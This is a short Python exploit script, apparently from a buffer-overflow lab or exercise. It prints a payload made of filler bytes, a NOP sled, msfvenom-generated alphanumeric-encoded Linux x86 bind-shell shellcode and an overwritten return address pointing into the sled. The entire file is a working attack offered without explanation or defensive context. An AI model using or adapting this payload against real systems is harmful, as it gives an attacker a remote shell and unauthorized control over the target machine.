#!/usr/bin/python

# msfvenom -p linux/x86/shell_bind_tcp AppendExit=true -e x86/alpha_mixed -f python
# 231 bytes
buf = "\xd9\xc3\xd9\x74\x24\xf4\x5d\x55\x59\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
buf += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x54\x71\x59\x4b\x6a\x57"
buf += "\x7a\x43\x76\x33\x70\x43\x62\x73\x61\x7a\x35\x52\x6e"
buf += "\x69\x59\x71\x4e\x50\x32\x46\x7a\x6d\x4d\x50\x71\x4b"
buf += "\x33\x6e\x30\x52\x70\x68\x45\x52\x75\x50\x66\x71\x53"
buf += "\x6c\x72\x4a\x46\x70\x62\x71\x50\x50\x4e\x69\x48\x61"
buf += "\x33\x5a\x61\x76\x73\x68\x78\x4d\x6d\x50\x4d\x59\x32"
buf += "\x61\x73\x34\x6d\x63\x43\x34\x58\x30\x73\x56\x4a\x6d"
buf += "\x4b\x30\x32\x63\x58\x30\x43\x56\x78\x4d\x6b\x30\x4e"
buf += "\x73\x52\x79\x32\x4a\x67\x4f\x53\x68\x58\x4d\x4b\x30"
buf += "\x47\x39\x51\x69\x48\x78\x55\x38\x76\x4f\x46\x4f\x50"
buf += "\x73\x32\x48\x30\x68\x74\x6f\x63\x52\x32\x49\x52\x4e"
buf += "\x4f\x79\x7a\x43\x46\x30\x70\x53\x6b\x39\x69\x71\x6e"
buf += "\x50\x64\x4b\x4a\x6d\x4f\x70\x76\x51\x79\x4b\x72\x4a"
buf += "\x35\x51\x43\x68\x5a\x6d\x4d\x50\x41\x41"

prefix = "A" * (1036 - 200 - len(buf))
nop = "\x90" * 200
# New EIP (Middle of Nopsled)
eip = "\x50\xcd\xff\xbf"
padding = "C" * (1100 - 1036 - 4)

print prefix + nop + buf + eip + padding
